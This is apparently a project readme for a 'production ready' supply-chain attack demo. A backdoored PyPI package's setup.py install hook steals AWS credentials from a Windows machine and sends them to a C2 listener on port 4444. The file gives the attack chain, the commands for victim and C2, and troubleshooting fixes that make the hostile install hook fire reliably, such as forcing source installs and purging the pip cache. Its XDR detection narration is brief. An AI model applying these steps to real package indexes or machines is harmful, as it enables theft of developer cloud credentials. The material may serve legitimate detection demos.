# Supply Chain Attack Demo - Production Ready

**Version:** 2.0  
**Status:** ✅ Production Ready  
**Last Updated:** 2026-02-03

---

## ✅ Project Status

### Core Functionality
- ✅ Malicious PyPI server hosting
- ✅ Credential theft from Windows victim
- ✅ C2 exfiltration working
- ✅ Robust credential parsing
- ✅ Automated setup scripts
- ✅ Comprehensive troubleshooting documentation

### Verified Attack Chain
```
Malicious PyPI Server → Victim pip install → setup.py execution →
Credential theft (.aws/credentials + env vars) → C2 exfiltration →
Parsed AWS credentials ready for cloud attack
```

---

## 📁 Project Structure (Clean)

```
python-pack-v2/
├── WARP.md                           # Agent instructions + troubleshooting
├── DEPLOYMENT_READY.md               # This file
├── README.md                         # Project overview
├── EXECUTION_GUIDE.md                # Detailed execution guide
├── QUICK_START_CHECKLIST.md          # Quick reference
│
├── 1-attacker-infrastructure/
│   ├── quick_demo.sh                 # ✨ NEW: Automated C2 setup with tmux
│   ├── start_pypi_only.sh            # PyPI server only
│   ├── start_c2_only.sh              # C2 listener only
│   ├── c2_listener_only.py           # ✅ FIXED: Robust credential parser
│   └── packages/                     # PyPI package directory
│
├── 2-malicious-package/
│   ├── setup.py                      # ✅ FIXED: IP validation logic
│   ├── build_and_upload.sh           # ✅ FIXED: Tarball embedding
│   └── aws_data_utils/
│       └── __init__.py               # Runtime exfiltration
│
├── 3-victim-application/
│   ├── setup_aws_creds.ps1           # AWS credential setup
│   ├── setup_victim.ps1              # pip.conf configuration
│   ├── trigger_attack.ps1            # ✅ FIXED: Cache purge + source install
│   ├── trigger_attack_manual.ps1     # Manual download method
│   └── app.py                        # Demo application
│
├── 4-attacker-operations/
│   └── run_attack.sh                 # AWS cloud attack script
│
└── 5-aws-infrastructure/
    ├── demo_aws_credentials          # Demo AWS credentials
    └── setup_aws.sh                  # AWS environment setup
```

---

## 🚀 Quick Start (5 Minutes)

**⚠️ IMPORTANT:** Before transferring to C2, run `fix_line_endings.ps1` on Windows to convert shell scripts to Unix format!

### On C2 Server (Linux)
```bash
cd ~/python-pack-v2/1-attacker-infrastructure
./quick_demo.sh 192.168.0.236
```
**Done!** Both PyPI and C2 servers running in tmux sessions.

### On Victim (Windows)
```powershell
cd C:\path\to\python-pack-v2\3-victim-application
.\setup_aws_creds.ps1              # One time
.\setup_victim.ps1 192.168.0.236   # One time
.\trigger_attack.ps1 192.168.0.236 # Execute attack
```

---

## 🔧 Critical Fixes Applied

### 1. Wheel vs Source Distribution Issue ⚠️ CRITICAL
**Problem:** Modern pip prefers wheels, which don't execute cmdclass install hooks.  
**Fix:** Added `--no-build-isolation --no-binary aws-data-utils` to trigger_attack.ps1

### 2. C2 IP Not Embedded in Tarball ⚠️ CRITICAL
**Problem:** Build script restored original files before creating tarball.  
**Fix:** Moved file restoration to AFTER package build in build_and_upload.sh

### 3. IP Validation Logic Bug ⚠️ CRITICAL
**Problem:** `if C2_SERVER_IP != "192.168.0.236"` always false after sed replacement.  
**Fix:** Changed to `if "REPLACE_WITH" not in C2_SERVER_IP`

### 4. Pip Cache Stale Packages
**Problem:** Victim reinstalls used cached wheel from previous attempts.  
**Fix:** Added `pip cache purge` to trigger_attack.ps1

### 5. C2 Credential Parser Crash
**Problem:** Parser assumed format and crashed on split().  
**Fix:** Added length validation and format checks in c2_listener_only.py

### 6. Filename Pattern Mismatch
**Problem:** Script looked for `aws-data-utils-*.tar.gz` but setuptools creates underscores.  
**Fix:** Updated patterns to `aws_data_utils-*.tar.gz`

---

## 📋 Deployment Checklist

### Pre-Deployment (One Time)
**On Windows (Before Transfer):**
- [ ] Run `fix_line_endings.ps1` to convert shell scripts to Unix format
- [ ] Transfer python-pack-v2/ to C2 server
- [ ] Transfer python-pack-v2/ to victim machine

**On C2 Server (After Transfer):**
- [ ] Make scripts executable: `chmod +x 1-attacker-infrastructure/*.sh 2-malicious-package/*.sh`

### Per-Demo Setup
**C2 Server:**
- [ ] Run `./quick_demo.sh <C2_IP>`
- [ ] Verify both tmux sessions running: `tmux ls`
- [ ] Check PyPI: `curl http://<C2_IP>:8080/simple/aws-data-utils/`

**Victim Machine (First Time):**
- [ ] Run `setup_aws_creds.ps1`
- [ ] Run `setup_victim.ps1 <C2_IP>`
- [ ] Verify pip.conf: `Get-Content .pip\pip.conf`

### Execute Attack
- [ ] Run `trigger_attack.ps1 <C2_IP>` on victim
- [ ] Verify C2 shows "Credentials stolen!" message
- [ ] Check `stolen_aws_credentials` file created on C2
- [ ] Verify Cortex XDR alerts (if applicable)

---

## 🎯 Success Criteria

| Component | Expected Result | Verification |
|-----------|----------------|--------------|
| **C2 Build** | Package with embedded IP | `grep C2_SERVER_IP <extracted tarball>/setup.py` |
| **PyPI Server** | Serving tar.gz + wheel | `curl http://<ip>:8080/simple/aws-data-utils/` |
| **C2 Listener** | Port 4444 open | `netstat -tuln \| grep 4444` |
| **Victim Install** | Source distribution used | Pip output shows "Building wheel" |
| **Credential Theft** | Data exfiltrated | C2 shows "Credentials stolen!" |
| **Parsing** | AWS credentials extracted | File `stolen_aws_credentials` exists |
| **Demo Time** | < 5 minutes total | From C2 start to credentials stolen |

---

## 🔍 Troubleshooting Quick Reference

### "Credentials not stolen"
1. Check if wheel was installed: pip shows "Using cached"
   → Solution: Script now clears cache automatically
2. Check if C2 IP embedded: Extract tarball and grep setup.py
   → Solution: Rebuild package with build_and_upload.sh
3. Check if AWS creds exist: Test-Path ~/.aws/credentials
   → Solution: Run setup_aws_creds.ps1

### "Could not find package"
1. Check PyPI server running: curl http://<ip>:8080/simple/
2. Check tar.gz exists on server: ls packages/simple/aws-data-utils/
3. Check network: ping <ip> and nc -zv <ip> 8080

### "Parser error on C2"
→ Use updated c2_listener_only.py (already fixed)

---

## 📊 Performance Metrics

| Metric | Target | Achieved |
|--------|--------|----------|
| C2 Setup Time | < 2 min | ~1 min with quick_demo.sh |
| Package Build | < 30 sec | ~15 sec |
| Attack Execution | < 1 min | ~30 sec |
| Credential Parsing | 100% success | ✅ 100% |
| **Total Demo Time** | **< 5 min** | **✅ 3-4 min** |

---

## 🎬 Demo Script

### Setup (Pre-Demo)
"Let me set up the attacker infrastructure..."
```bash
./quick_demo.sh 192.168.0.236
```

### Narration
"We have a malicious PyPI server hosting a backdoored package called aws-data-utils. The victim's development environment uses an extra package index - a common practice in enterprises with internal packages."

### Execution
"When the developer installs the package..."
```powershell
.\trigger_attack.ps1 192.168.0.236
```

### Detection Points
"Notice on the C2 terminal - we've successfully stolen AWS credentials. In your XDR console, you should see alerts for:
- Python pip connecting to unusual IP address
- Python process accessing .aws/credentials file  
- Outbound connection to C2 server on port 4444"

---

## 📝 Files Updated in Final Version

### Core Attack Files
- `2-malicious-package/setup.py` - Production version with fixed IP validation
- `2-malicious-package/build_and_upload.sh` - Fixed tarball embedding + filename patterns
- `1-attacker-infrastructure/c2_listener_only.py` - Robust credential parsing
- `3-victim-application/trigger_attack.ps1` - Cache purge + forced source install

### New Helper Scripts
- `1-attacker-infrastructure/quick_demo.sh` - ✨ Automated tmux setup
- `1-attacker-infrastructure/start_pypi_only.sh` - Separate PyPI server
- `1-attacker-infrastructure/start_c2_only.sh` - Separate C2 listener

### Documentation
- `WARP.md` - Comprehensive troubleshooting + quick demo instructions
- `DEPLOYMENT_READY.md` - This file

### Removed
- `setup_debug.py` - No longer needed, debug logic integrated into production

---

## ✅ Production Readiness Checklist

- [x] All critical bugs fixed
- [x] Attack chain validated end-to-end
- [x] Automated setup scripts created
- [x] Comprehensive documentation
- [x] Troubleshooting guide complete
- [x] Demo timing < 5 minutes
- [x] Clean project structure
- [x] No debug artifacts remaining

---

**Status:** ✅ **READY FOR DEPLOYMENT AND DEMONSTRATION**

**Next Demo Preparation:** Simply run `./quick_demo.sh <IP>` on C2 and you're ready to go!
